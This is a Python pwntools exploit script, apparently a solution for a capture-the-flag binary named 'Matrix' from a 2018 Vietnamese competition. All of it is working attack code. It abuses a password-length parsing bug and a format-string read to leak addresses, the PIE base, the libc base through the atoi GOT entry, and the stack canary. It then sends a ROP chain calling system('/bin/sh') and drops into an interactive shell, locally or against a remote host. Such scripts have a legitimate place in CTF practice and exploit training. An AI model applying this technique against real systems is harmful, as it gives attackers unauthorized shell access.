#!/usr/bin/env python
from pwn import *
import sys,time
HOST = 'None'
PORT = None

def info(s):
	log.info(s)

def login(leng,name):
	time.sleep(1)
	p.sendlineafter('>','2')
	p.sendlineafter('Enter length of password:',str(leng)+'a')
	p.sendline(name)

def exploit(p):
	p.sendlineafter('>','4')
	login(64,'a'*64)
	p.recvuntil('Wrong password: '+'a'*64)
	l=p.recvline()[:-1]
	l=u64(l.ljust(8,'\x00'))
	info("leak is 0x%x"%l)
	inp = l+93
	info("input at 0x%x"%inp)
	payload='%3$p|'.ljust(64,'b')+p64(inp)
	login(0xffffff90,payload)
	l=int(p.recvuntil('|')[:-1],16)
	base=l-0x2041A0
	info("base at 0x%x"%base)
	can=inp+103
	info("canary at 0x%x"%can)
	payload='b'*64+p64(base+0x0203FC8) # atoi got
	login(0xffffff90,payload)
	atoi=u64((p.recvuntil('Wr')[:-2]).ljust(8,'\x00'))
	baselibc=atoi-libc.symbols['atoi']
	info("base of libc is 0x%x"%baselibc)
	payload='b'*64+p64(can+1)
	login(0xffffff90,payload)
	canary=u64((p.recv(7)).rjust(8,'\x00'))
	info("canary is 0x%x"%canary)
	ret=base+0x11C0
	poprdi=base+0x0000000000003433
	payload='b'*64+p64(can)
	payload+='b'*(103-len(payload))+p64(canary)+'c'*8
	temp=p64(poprdi)+p64(baselibc+next(libc.search('/bin/sh\x00')))+p64(baselibc+libc.symbols['system'])
	payload+=temp
	login(0xffffff90,payload)
	p.sendlineafter('>','3')
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('/home/khongtrang/share/2018/svattt18/quals/pwn/Matrix')
		print util.proc.pidof(p)
		libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)
